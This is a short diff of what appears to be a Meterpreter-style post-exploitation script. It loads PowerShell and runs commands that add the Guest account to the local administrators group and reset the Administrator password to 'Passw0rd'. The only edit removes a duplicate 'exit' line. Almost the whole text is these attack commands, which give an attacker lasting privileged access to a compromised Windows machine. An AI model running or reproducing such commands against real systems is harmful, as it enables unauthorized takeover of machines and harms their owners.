@@ -2,6 +2,5 @@ load powershell
 powershell_execute "net localgroup administrators Guest /add"
 powershell_execute "net user Administrator Passw0rd"
 exit
-exit
 
 
